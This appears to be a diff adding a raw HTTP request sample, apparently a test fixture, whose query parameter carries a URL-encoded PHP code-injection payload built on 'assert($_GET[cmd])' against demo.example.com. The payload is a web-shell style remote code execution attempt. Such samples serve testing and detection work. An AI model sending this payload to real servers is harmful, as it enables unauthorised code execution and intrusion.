@@ -1,0 +1,4 @@
+GET /a?id="a%3Dassert($_GET[cmd])" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
